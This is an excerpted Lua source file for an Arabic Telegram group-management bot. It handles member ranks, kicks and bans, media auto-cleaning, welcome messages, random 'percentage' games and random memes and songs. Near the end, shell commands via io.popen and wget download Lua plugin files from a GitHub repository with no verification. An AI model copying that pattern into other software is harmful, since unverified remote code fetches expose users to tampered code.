if SaveKt == 'SaveKt' then
local GetKtTexts = DevAbs:get(Antak..'Abs:Add:KtTexts'..msg.sender_user_id_..msg.chat_id_)
local List = DevAbs:smembers(Antak..'Abs:Text:KtTexts'..GetKtTexts..msg.chat_id_)
if text == "الغاء" then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "✯︙✯︙تم الغاء عملية حفظ اسئلة الكت  ↫ "..GetKtTexts ,  1, "md")
DevAbs:del(Antak..'Abs:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
DevAbs:del(Antak..'Abs:Text:KtTexts'..GetKtTexts..msg.chat_id_)
DevAbs:del(Antak..'Abs:Add:KtTexts'..msg.sender_user_id_..msg.chat_id_)
DevAbs:srem(Antak..'Abs:Sudo:Kt'..msg.chat_id_,GetKtTexts)
return false
end
Text = text:gsub('"',""):gsub('"',""):gsub("`",""):gsub("*","")
DevAbs:sadd(Antak..'Abs:Text:KtTexts'..GetKtTexts..msg.chat_id_,Text)
if #List == 100 then 
...
if text and not DevAbs:get(Antak..'Abs:Add:Kt'..msg.sender_user_id_..msg.chat_id_) then
if DevAbs:sismember(Antak..'Abs:Sudo:Kt'..msg.chat_id_,text) then
local AntakTeam =  DevAbs:smembers(Antak..'Abs:Text:KtTexts'..text..msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '['..AntakTeam[math.random(#AntakTeam)]..']' , 1, 'md')  
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
local Welcomes = Welcomes:gsub('username',('[@'..result.username_..']' or '[@BAANDDE]'))
...
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = Antak,offset_ = 0,limit_ = 1},function(extra,Abs,success) 
...
if DevAbs:get(Antak.."Abs:Photo:BotWelcome") then AbsPhoto = DevAbs:get(Antak.."Abs:Photo:BotWelcome") elseif Abs.photos_[0] then AbsPhoto = Abs.photos_[0].sizes_[1].photo_.persistent_id_ else AbsPhoto = nil end 
...
local Welcomes = Welcomes:gsub('username',('[@'..msg.content_.members_[0].username_..']' or '[@BAANDDE]'))
Dev_Abs(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
--        Contact         --
...
local UsersBot = DevAbs:smembers(Antak..'Abs:Users')  
local Get_Json = '{"BotId": '..Antak..','  
if #UsersBot ~= 0 then 
...
local Malk = DevAbs:smembers(Antak..":Abs:AbsConstructor:"..v)
local President = DevAbs:smembers(Antak.."Abs:BasicConstructor:"..v)
local Constructor = DevAbs:smembers(Antak..":Abs:Constructor:"..v)
local Manager = DevAbs:smembers(Antak.."Abs:Managers:"..v)
local Admin = DevAbs:smembers(Antak.."Abs:Admins:"..v)
local Vips = DevAbs:smembers(Antak.."Abs:VipMem:"..v)
if k == 1 then
Get_Json = Get_Json..'"'..v..'":{'
else
Get_Json = Get_Json..',"'..v..'":{'
...
File:write(Get_Json)
File:close()
return sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..Antak..'.json', '',dl_cb, nil)
end
...
local Tsl = DevAbs:get(Antak..'Abs:Tsl')
local Text = [[
...
elseif Constructor(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..Abs},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..Abs}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..Abs},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..Abs}},{{text = '⌁ Antak TeAM.',url="t.me/BAANDDE"}}}
elseif Manager(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..Abs},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..Abs}}}
elseif Admin(data) then
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == "الرابط" then
local Link = DevAbs:get(Antak..'Abs:Link')
local Text = [[
...
if not DevAbs:get(Antak..'Abs:Lock:Games'..msg.chat_id_) then
local Games = DevAbs:get(Antak..'Abs:Games')
local Text = [[
...
function AntakTeam(extra,result,success)
if DevAbs:get(Antak.."Abs:Send:Bot"..Antak) and not AbsSudo(msg) then 
...
Text = "✯︙اهلا بك عزيزي \n✯︙عليك اضافة هذا البوت @kg7bot الى مجموعتك\n✯︙ثم رفعه مشرفا ثم اتبع الاوامر التاليه [هـنـا](https://t.me/BAANDDE/6499)"
keyboard = {} 
keyboard.inline_keyboard = {
...
local AntakTeam = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تعطيل تفاعلي'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(Antak..'Abs:msg:Abs'..msg.chat_id_) 
end
if text == "تفعيل تفاعلي" and Manager(msg) and ChCheck(msg) then
local AntakTeam = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تفعيل تفاعلي'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(Antak..'Abs:msg:Abs'..msg.chat_id_,true)  
end
if DevAbs:get(Antak.."Abs:msg:Abs"..msg.chat_id_) then
if msg.content_.ID then
get_msg = DevAbs:get(Antak.."Abs:msg:Abs"..msg.sender_user_id_..":"..msg.chat_id_) or 0
gms = get_msg + 1
DevAbs:setex(Antak..'Abs:msg:Abs'..msg.sender_user_id_..":"..msg.chat_id_,86400,gms)
end
...
function prom_reply(extra, result, success) 
get_msg = DevAbs:get(Antak.."Abs:msg:Abs"..result.sender_user_id_..":"..msg.chat_id_) or 0
...
if DevAbs:sismember(Antak..'Abs:AbsSudo:',result.sender_user_id_) then
...
if DevAbs:sismember(Antak..'Abs:Owner:'..msg.chat_id_, result.sender_user_id_) then
...
DevAbs:srem(Antak..'Abs:AbsSudo:', result.sender_user_id_)
DevAbs:srem(Antak..'Abs:SecondSudo:', result.sender_user_id_)
DevAbs:srem(Antak..'Abs:SudoBot:', result.sender_user_id_)
DevAbs:srem(Antak..'Abs:Owner:'..msg.chat_id_,result.sender_user_id_)
...
if DevAbs:sismember(Antak..'Abs:AbsSudo:',result.id_) then
Abssudo = 'المطورين الاساسيين • ' else Abssudo = '' end
if DevAbs:sismember(Antak..'Abs:SecondSudo:',result.id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevAbs:sismember(Antak..'Abs:SudoBot:',result.id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevAbs:sismember(Antak..'Abs:Owner:'..msg.chat_id_, result.id_) then
owner = 'المالكين • ' else owner = '' end
...
if AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
DevAbs:srem(Antak..'Abs:AbsSudo:', result.id_)
DevAbs:srem(Antak..'Abs:SecondSudo:', result.id_)
DevAbs:srem(Antak..'Abs:SudoBot:', result.id_)
DevAbs:srem(Antak..'Abs:Owner:'..msg.chat_id_,result.id_)
...
DevAbs:sadd(Antak..'Abs:AbsSudo:',result.sender_user_id_)
...
if result.id_ then
DevAbs:sadd(Antak..'Abs:AbsSudo:',result.id_)
...
DevAbs:sadd(Antak..'Abs:AbsSudo:',user)
...
DevAbs:srem(Antak..'Abs:AbsSudo:',user)
...
DevAbs:sadd(Antak..'Abs:Owner:'..msg.chat_id_,result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(Antak..'Abs:Owner:'..msg.chat_id_,result.id_)
...
DevAbs:sadd(Antak..'Abs:Owner:'..msg.chat_id_,user)
...
DevAbs:srem(Antak..'Abs:Owner:'..msg.chat_id_,user)
...
function raf_reply(extra, result, success)
if not AbsConstructor(msg) and DevAbs:get(Antak.."Abs:Lock:ProSet"..msg.chat_id_) then 
...
if not AbsConstructor(msg) and DevAbs:get(Antak.."Abs:Lock:KickBan"..msg.chat_id_) then 
...
if not AbsConstructor(msg) and DevAbs:get(Antak.."Abs:Lock:MuteTked"..msg.chat_id_) then 
...
if DevAbs:sismember(Antak..'Abs:AbsSudo:',result.sender_user_id_) and not Sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "✯︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevAbs:sismember(Antak..'Abs:SecondSudo:',result.sender_user_id_) and not AbsSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "✯︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
ChatKick(result.chat_id_, result.sender_user_id_)
...
if DevAbs:sismember(Antak..'Abs:AbsSudo:',result.id_) and not Sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "✯︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevAbs:sismember(Antak..'Abs:SecondSudo:',result.id_) and not AbsSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "✯︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
if result.id_ then
...
if DevAbs:sismember(Antak..'Abs:AbsSudo:',user) and not Sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "✯︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevAbs:sismember(Antak..'Abs:SecondSudo:',user) and not AbsSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "✯︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
ChatKick(msg.chat_id_, user)
...
if DevAbs:get(Antak..'Abs:Lock:Clean'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.animated_ then if msg.reply_to_message_id_ ~= 0 then DevAbs:sadd(Antak.."Abs:cleaner"..msg.chat_id_, msg.id_) else DevAbs:sadd(Antak.."Abs:cleaner"..msg.chat_id_, msg.id_) end end end
if DevAbs:get(Antak..'Abs:Lock:CleanNum'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.animated_ then if msg.reply_to_message_id_ ~= 0 then DevAbs:sadd(Antak.."Abs:cleanernum"..msg.chat_id_, msg.id_) else DevAbs:sadd(Antak.."Abs:cleanernum"..msg.chat_id_, msg.id_) end end end
if DevAbs:get(Antak..'Abs:Lock:CleanMusic'..msg.chat_id_) then if msg.content_.voice_ or msg.content_.audio_ then if msg.reply_to_message_id_ ~= 0 then DevAbs:sadd(Antak.."Abs:cleanermusic"..msg.chat_id_, msg.id_) else DevAbs:sadd(Antak.."Abs:cleanermusic"..msg.chat_id_, msg.id_) end end end
...
local List = DevAbs:smembers(Antak..'Abs:Owner:'..msg.chat_id_)
text = "✯︙قائمة المالكين ↫ ⤈ \n𓍹======𝔹𝔸ℕ𝔻𝔼======𓍻\n"
for k,v in pairs(List) do
local username = DevAbs:get(Antak..'Save:UserName'..v)
if username then
...
keyboard = {} 
keyboard.inline_keyboard = {{{text=''..dp.first_name_..'',url="t.me/"..dp.username_ or AntakTeam}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(Text)..'&photo='..getpro.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
...
local List = DevAbs:smembers(Antak..'Abs:AbsSudo:')
...
if text == 'تحويل' and not DevAbs:get(Antak..'Abs:Thwel:Abs'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then 
...
function AntakTeam(extra,Abs,success)
...
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(Antak..'Abs:Lock:CleanNum'..msg.chat_id_,true)  
end
...
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(Antak..'Abs:Lock:CleanNum'..msg.chat_id_) 
end
...
if msg and DevAbs:get(Antak..'Abs:Lock:CleanNum'..msg.chat_id_) then
...
if DevAbs:scard(Antak.."Abs:cleanernum"..msg.chat_id_) >= tonumber(CleanNum) then 
local List = DevAbs:smembers(Antak.."Abs:cleanernum"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
DevAbs:del(Antak.."Abs:cleanernum"..msg.chat_id_)
end 
end
if CleanerNum(msg) then
if DevAbs:get(Antak..'Abs:Lock:CleanNum'..msg.chat_id_) then 
if text == "التلقائي" and ChCheck(msg) or text == "عدد التلقائي" and ChCheck(msg) then 
local M = DevAbs:scard(Antak.."Abs:cleanernum"..msg.chat_id_)
if M ~= 0 then
...
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(Antak..'Abs:Lock:CleanMusic'..msg.chat_id_,true)  
end
if text == "تعطيل مسح الاغاني" and Constructor(msg) then
local AntakTeam = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تعطيل مسح الاغاني بنجاح'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(Antak..'Abs:Lock:CleanMusic'..msg.chat_id_) 
end
if CleanerMusic(msg) then
if DevAbs:get(Antak..'Abs:Lock:CleanMusic'..msg.chat_id_) then 
if text == "الاغاني" and ChCheck(msg) or text == "عدد الاغاني" and ChCheck(msg) then 
local M = DevAbs:scard(Antak.."Abs:cleanermusic"..msg.chat_id_)
if M ~= 0 then
...
local List = DevAbs:smembers(Antak.."Abs:cleanermusic"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
DevAbs:del(Antak.."Abs:cleanermusic"..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "✯︙لاتوجد اغاني هنا", 1, 'md') 
end end end end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
DevAbs:del(Antak..'Abs:Owner:'..msg.chat_id_)
end
end
if Owner(msg) then
...
local AntakTeam = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تفعيل كول'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(Antak..'Speak:after:me'..msg.chat_id_) 
end
if text == "تعطيل كول" and Manager(msg) and ChCheck(msg) then
local AntakTeam = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تعطيل كول'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(Antak..'Speak:after:me'..msg.chat_id_,true)  
end
if text and text:match("^كول (.*)$") and ChCheck(msg) and not DevAbs:get(Antak.."Speak:after:me"..msg.chat_id_) then
...
DevAbs:set(Antak..'RyNsba:Abs'..msg.chat_id_..msg.sender_user_id_,true)
Dev_Abs(msg.chat_id_, msg.id_, 1, '✯︙قم بارسل اسمين لحساب نسبة الخيانه بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الخيانه" and text ~= "نسبة الخيانه" and text ~= "↫ نسبه الخيانه ✯" and DevAbs:get(Antak..'RyNsba:Abs'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '✯︙تم الغاء امر نسبة الخيانه ', 1, 'md')
DevAbs:del(Antak..'RyNsba:Abs'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Abs = math.random(0,100);
...
DevAbs:set(Antak..'JNsba:Abs'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Abs(msg.chat_id_, msg.id_, 1, '✯︙قم بارسل اسم الشخص لقياس نسبة جماله كمثال ↫ جاك او روز', 1, 'md')
end
end
if text and text ~= "نسبه الجمال" and text ~= "نسبة الجمال" and text ~= "↫ نسبه الجمال ✯" and DevAbs:get(Antak..'JNsba:Abs'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '✯︙تم الغاء امر نسبة الجمال ', 1, 'md')
DevAbs:del(Antak..'JNsba:Abs'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Abs = math.random(0,100);
...
if text and text ~= "نسبه الكره" and text ~= "نسبة الكره" and text ~= "↫ نسبه الكره ✯" and DevAbs:get(Antak..'HataNsba:Abs'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
...
if text and text ~= "نسبه الرجوله" and text ~= "نسبة الرجوله" and text ~= "نسبه رجوله" and text ~= "نسبة رجوله" and text ~= "↫ نسبه الرجوله ✯" and DevAbs:get(Antak..'RjolaNsba:Abs'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
...
if text and text ~= "نسبه الانوثه" and text ~= "نسبة الانوثه" and text ~= "نسبه انوثه" and text ~= "نسبة انوثه" and text ~= "↫ نسبه الانوثه ✯" and DevAbs:get(Antak..'AnothaNsba:Abs'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
...
if text and text ~= "نسبه الغباء" and text ~= "نسبة الغباء" and text ~= "↫ نسبه الغباء ✯" and DevAbs:get(Antak..'StupidNsba:Abs'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
...
local AntakTeam = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تفعيل المتحركه'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(Antak..'Abs:gif:Abs'..msg.chat_id_) 
end
if text == "تعطيل متحركه" and Manager(msg) and ChCheck(msg) or text == "تعطيل المتحركه" and Manager(msg) and ChCheck(msg) then
local AntakTeam = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تعطيل المتحركه'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(Antak..'Abs:gif:Abs'..msg.chat_id_,true)  
end
if text and (text == "متحركه" or text == "↫ متحركه ✯") and not DevAbs:get(Antak..'Abs:gif:Abs'..msg.chat_id_) and ChCheck(msg) then
Abs = math.random(2,1075); 
local Text ='*✯︙تم اختيار المتحركه لك*'
keyboard = {}  
...
local AntakTeam = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تفعيل الميمز'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(Antak..'Abs:memz:Abs'..msg.chat_id_) 
end
if text == "تعطيل ميمز" and Manager(msg) and ChCheck(msg) or text == "تعطيل الميمز" and Manager(msg) and ChCheck(msg) then
local AntakTeam = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تعطيل الميمز'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(Antak..'Abs:memz:Abs'..msg.chat_id_,true)  
end
if text and (text == "ميمز" or text == "↫ ميمز ✯") and not DevAbs:get(Antak..'Abs:memz:Abs'..msg.chat_id_) and ChCheck(msg) then
Abs = math.random(2,1201); 
local Text ='*✯︙تم اختيار مقطع الميمز لك*'
keyboard = {}  
...
if text and (text == "غنيلي" or text == "↫ غنيلي ✯") and not DevAbs:get(Antak..'Abs:Audios:Abs'..msg.chat_id_) and ChCheck(msg) then
Abs = math.random(4,2824); 
local Text ='*✯︙تم اختيار المقطع الصوتي لك*'
keyboard = {}  
...
local AntakTeam = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تفعيل الاغاني'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(Antak..'Abs:mp3:Abs'..msg.chat_id_) 
end
if text == "تعطيل الاغاني" and Manager(msg) and ChCheck(msg) or text == "تعطيل اغنيه" and Manager(msg) and ChCheck(msg) then
local AntakTeam = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تعطيل الاغاني'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(Antak..'Abs:mp3:Abs'..msg.chat_id_,true)  
end
if text and (text == "اغنيه" or text == "↫ اغنيه ✯" or text == "اغاني") and not DevAbs:get(Antak..'Abs:mp3:Abs'..msg.chat_id_) and ChCheck(msg) then
Abs = math.random(2,1167); 
...
local AntakTeam = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تفعيل الريمكس'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(Antak..'Abs:Remix:Abs'..msg.chat_id_) 
end
if text == "تعطيل ريمكس" and Manager(msg) and ChCheck(msg) or text == "تعطيل الريمكس" and Manager(msg) and ChCheck(msg) then
local AntakTeam = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تعطيل الريمكس'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(Antak..'Abs:Remix:Abs'..msg.chat_id_,true)  
end
if text and (text == "ريمكس" or text == "↫ ريمكس ✯") and not DevAbs:get(Antak..'Abs:Remix:Abs'..msg.chat_id_) and ChCheck(msg) then
...
local AntakTeam = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تفعيل الصوره'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(Antak..'Abs:Photo:Abs'..msg.chat_id_) 
end
if text == "تعطيل صوره" and Manager(msg) and ChCheck(msg) or text == "تعطيل الصوره" and Manager(msg) and ChCheck(msg) then
local AntakTeam = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تعطيل الصوره'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(Antak..'Abs:Photo:Abs'..msg.chat_id_,true)  
end
if text and (text == "صوره" or text == "↫ صوره ✯") and not DevAbs:get(Antak..'Abs:Photo:Abs'..msg.chat_id_) and ChCheck(msg) then
Abs = math.random(4,1171); 
local Text ='*✯︙تم اختيار الصوره لك*'
keyboard = {}  
...
local AntakTeam = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تفعيل الانمي'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(Antak..'Abs:Anime:Abs'..msg.chat_id_) 
end
if text == "تعطيل انمي" and Manager(msg) and ChCheck(msg) or text == "تعطيل الانمي" and Manager(msg) and ChCheck(msg) then
local AntakTeam = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تعطيل الانمي'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(Antak..'Abs:Anime:Abs'..msg.chat_id_,true)  
end
if text and (text == "انمي" or text == "↫ انمي ✯") and not DevAbs:get(Antak..'Abs:Anime:Abs'..msg.chat_id_) and ChCheck(msg) then
Abs = math.random(3,1002); 
local Text ='*✯︙تم اختيار صورة الانمي لك*'
keyboard = {}  
...
local AntakTeam = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تفعيل الافلام'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(Antak..'Abs:Movies:Abs'..msg.chat_id_) 
end
if text == "تعطيل فلم" and Manager(msg) and ChCheck(msg) then
local AntakTeam = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تعطيل الافلام'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(Antak..'Abs:Movies:Abs'..msg.chat_id_,true)  
end
if text and (text == "فلم" or text == "↫ فلم ✯") and not DevAbs:get(Antak..'Abs:Movies:Abs'..msg.chat_id_) and ChCheck(msg) then
...
if text and (text == "مسلسل" or text == "↫ مسلسل ✯") and not DevAbs:get(Antak..'Abs:Series:Abs'..msg.chat_id_) and ChCheck(msg) then
...
if LinkGp.ok == true then LinkGroup = LinkGp.result else LinkGroup = 't.me/BAANDDE' end
...
ConstructorAbs = "["..Abs.first_name_.."](T.me/"..(Abs.username_ or "BAANDDE")..")"
else 
...
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(Antak..'Abs:Lock:Gamesinline'..msg.chat_id_) 
end
...
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(Antak..'Abs:Lock:Gamesinline'..msg.chat_id_,true)  
end
...
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(Antak.."Abs:Lock:GpLinksinline"..msg.chat_id_,"ok")
return false  
end
end
...
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(Antak.."Abs:Lock:GpLinksinline"..msg.chat_id_)
return false  
end
end
...
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(Antak.."Abs:Lock:GpRd"..msg.chat_id_)
return false  
end
end
...
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(Antak.."Abs:Lock:GpRd"..msg.chat_id_,true)
return false  
end
end
...
local AntakTeam = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تفعيل اضف رد'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(Antak.."Abs:Lock:Rd"..msg.chat_id_)
return false  
end
end
...
local AntakTeam = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تعطيل اضف رد'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(Antak.."Abs:Lock:Rd"..msg.chat_id_,true)
return false  
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
if not Bot(msg) and DevAbs:get(Antak..'Abs:Lock:Rd'..msg.chat_id_) then 
...
DevAbs:set(Antak..'Abs:Add:Kt'..msg.sender_user_id_..msg.chat_id_,'SetKt')
Dev_Abs(msg.chat_id_, msg.id_, 1, "✯︙حسنا ارسل امر `كت تويت` الان" ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local SetKt = DevAbs:get(Antak..'Abs:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
if SetKt == 'SetKt' then
if text == "الغاء" then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "✯︙تم الغاء الامر" ,  1, "md")
DevAbs:del(Antak..'Abs:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
...
DevAbs:set(Antak..'Abs:Add:Kt'..msg.sender_user_id_..msg.chat_id_,'SaveKt')
DevAbs:set(Antak..'Abs:Add:KtTexts'..msg.sender_user_id_..msg.chat_id_,text)
DevAbs:sadd(Antak..'Abs:Sudo:Kt'..msg.chat_id_,text)
return false
end end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
if not Bot(msg) and DevAbs:get(Antak..'Abs:Lock:GpRd'..msg.chat_id_) then 
...
local Leave = DevAbs:get(Antak..'Abs:Leave')
local Text = [[
...
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(Antak.."Abs:WhyTube"..msg.chat_id_) 
return false  
end
if text == 'تعطيل اليوتيوب' and Manager(msg) then  
local AntakTeam = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تعطيل اليوتيوب بنجاح'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AntakTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(Antak.."Abs:WhyTube"..msg.chat_id_,true) 
return false  
end 
...
io.popen("cd Files && wget https://raw.githubusercontent.com/AntakTeam/AntakFiles/main/AntakFiles/AddedMe.lua") 
io.popen("cd Files && wget https://raw.githubusercontent.com/AntakTeam/AntakFiles/main/AntakFiles/AutoFile.lua")  
io.popen("cd Files && wget https://raw.githubusercontent.com/AntakTeam/AntakFiles/main/AntakFiles/ChangeName.lua") 
io.popen("cd Files && wget https://raw.githubusercontent.com/AntakTeam/AntakFiles/main/AntakFiles/ChangePhoto.lua") 
